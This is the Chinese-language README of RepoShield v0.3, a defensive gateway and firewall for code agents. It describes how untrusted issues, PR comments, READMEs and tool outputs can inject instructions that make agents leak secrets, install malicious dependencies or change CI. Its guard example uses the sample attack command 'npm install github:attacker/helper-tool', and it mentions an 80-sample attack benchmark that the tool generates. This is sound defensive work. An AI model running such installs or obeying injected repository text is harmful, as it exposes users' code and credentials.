# RepoShield / PepoShield v0.3

RepoShield 是面向代码智能体的上下文溯源、意图绑定与零信任执行防火墙。v0.3 在 v0.2 的 adapter、沙箱、MCP、Memory、Approval、Bench 和审计能力上，继续加入 OpenAI-compatible Governance Gateway、InstructionIR、tool parser plugin registry、policy plugin runtime、two-layer taint registry、RepoShield Studio 和 80 个 Gateway Bench 样本。

命令入口同时保留 reposhield 和 peposhield。

## 项目定位

Claude Code、Codex、Cline、Aider 等代码智能体已经能够读取仓库、修改文件、执行命令、调用工具，甚至接入 CI/CD 和发布链路。GitHub issue、PR 评论、README、分支名、MCP 工具输出和依赖包脚本等不可信上下文，可能诱导代码智能体执行危险动作，例如读取密钥、安装恶意依赖、修改 CI 配置或外发敏感信息。

RepoShield 的目标是在代码智能体真正执行动作之前，对上下文来源、任务意图、动作语义、执行环境和外发行为进行统一约束与审计。

## v0.3 新增能力

```text
真实/模拟 Agent
  │ OpenAI-compatible /v1/chat/completions 或 /v1/responses
  ▼
RepoShield Gateway
  ├─ pre-call trace
  ├─ context source tagging
  ├─ post-call InstructionIR parsing
  ├─ tool parser plugin registry
  ├─ InstructionIR → ActionIR lowering
  ├─ TaskContract / PolicyRuntime / Approval
  ├─ Sandbox / package preflight / secret egress sentinel
  └─ Audit / Replay / Studio / Gateway Bench
```

核心目录：

```text
src/reposhield/gateway/          OpenAI-compatible Gateway
src/reposhield/instruction_ir/   InstructionIR schema、builder、lowering
src/reposhield/plugins/          tool parser plugin registry
src/reposhield/policy_runtime/   enforce / observe_only / warn / disabled
src/reposhield/registry/         source/user two-layer registry + taint store
src/reposhield/studio/           HTML Studio dashboard
src/reposhield/gateway_bench.py  80 个 Gateway Bench 样本生成与评分
samples_stage3/                  v0.3 Gateway Bench 样本
reports/                         本地生成的 demo、bench、studio、incident 报告
```

## 核心能力

- 上下文来源标记
- 任务合同生成
- 动作语义解析与 lowering
- 策略决策引擎
- 沙箱预演
- 敏感信息外发检测
- 攻击链审计回放
- Gateway Bench 评测
- Studio 报表聚合

## 快速开始

```bash
cd reposhield_plugin_v0.3
python -m pip install -e '.[test]'
python -m compileall -q src
pytest -q
```

如果只想直接用源码运行：

```bash
PYTHONPATH=src python -m reposhield --help
```

## 常用命令

```bash
reposhield scan
reposhield guard
reposhield parse
reposhield demo
reposhield run-agent
reposhield gateway-demo
reposhield gateway-simulate
reposhield gateway-start
reposhield bench
reposhield bench-suite
reposhield generate-stage2-samples
reposhield generate-stage3-samples
reposhield gateway-bench
reposhield bench-report
reposhield incident-report
reposhield studio
reposhield sandbox-profiles
reposhield audit-verify
reposhield replay-verify
```

## 典型流程

### 1. 扫描仓库

```bash
reposhield scan --repo ./demo-repo
```

输出会包含仓库资产、攻击面、CI/CD workflow、package manifest、lockfile、publish 配置、MCP 配置和外发 sink 等信息。

### 2. 对单个动作做安全决策

```bash
reposhield guard \
  --repo ./demo-repo \
  --task '修复登录按钮点击无响应的问题，并运行测试' \
  --source-file ./issue.md \
  --source-type github_issue_body \
  --action 'npm install github:attacker/helper-tool'
```

预期结果是对高风险依赖安装动作给出 block 或需要审批的决策。

### 3. 运行 demo

```bash
reposhield demo --workdir /tmp/reposhield_demo
```

demo 会演示一个固定攻击链，展示如何阻断可疑依赖安装、敏感文件外发和越权操作。

### 4. 运行 Gateway demo

```bash
PYTHONPATH=src python -m reposhield gateway-demo --workdir reports/gateway_demo_run
```

### 5. 启动本地 OpenAI-compatible Gateway

```bash
PYTHONPATH=src python -m reposhield gateway-start \
  --repo ./demo_repo \
  --host 127.0.0.1 \
  --port 8765
```

支持的路由：

```text
POST /v1/chat/completions
POST /v1/responses
```

agent 可配置为：

```text
base_url = http://127.0.0.1:8765/v1
api_key  = reposhield-local
model    = reposhield/local-heuristic
```

### 6. 生成并运行第三阶段 Gateway Bench

```bash
PYTHONPATH=src python -m reposhield generate-stage3-samples \
  --output samples_stage3 \
  --count 80

PYTHONPATH=src python -m reposhield gateway-bench \
  --samples samples_stage3 \
  --output reports/stage3_gateway_bench
```

### 7. 生成 Studio

```bash
PYTHONPATH=src python -m reposhield studio \
  --audit reports/gateway_demo_run/gateway_audit.jsonl \
  --bench-report reports/stage3_gateway_bench/gateway_bench_report.json \
  --output reports/stage3_studio.html \
  --title 'RepoShield v0.3 Studio'
```

## 已验证结果

```text
python -m compileall -q src    -> ok
pytest -q                      -> 22 passed
Gateway demo                   -> blocked npm install github:attacker/helper-tool
Gateway Bench                  -> 80 samples, security_pass_rate=1.0
Audit verify                   -> ok=true
```

详见本地生成的测试输出，公开仓库不再跟踪该结果文件。

## 文档入口

- [第三阶段使用说明](docs/THIRD_STAGE_USAGE.zh-CN.md)
- [Gateway 指南](docs/GATEWAY_GUIDE.zh-CN.md)
- [Policy Pack 指南](docs/POLICY_PACK_GUIDE.zh-CN.md)
- [Tool Parser Plugin 指南](docs/TOOL_PARSER_PLUGIN_GUIDE.zh-CN.md)
- [Studio 指南](docs/STUDIO_GUIDE.zh-CN.md)
- [Gateway Bench 指南](docs/BENCH_GATEWAY_GUIDE.zh-CN.md)

## 说明

v0.3 的 Gateway 和沙箱后端仍以本地演示、测试和可回放评测为目标。gateway-start 使用标准库 HTTP server；生产环境可以把 RepoShieldGateway 包到 FastAPI、LiteLLM proxy、企业网关或真实 Linux namespace、eBPF、seccomp 后端中。控制平面、ActionIR、InstructionIR、policy runtime、审计、Studio 和 Bench 接口已经为这类替换预留。

## 开发规范

1. 不直接修改 main 分支。
2. 每个功能单独创建 feature 分支。
3. 每次提交必须写清楚 commit message。
4. 合并代码前必须提交 Pull Request。
5. 不允许上传真实 token、密钥、.env、SSH key 或 API key。
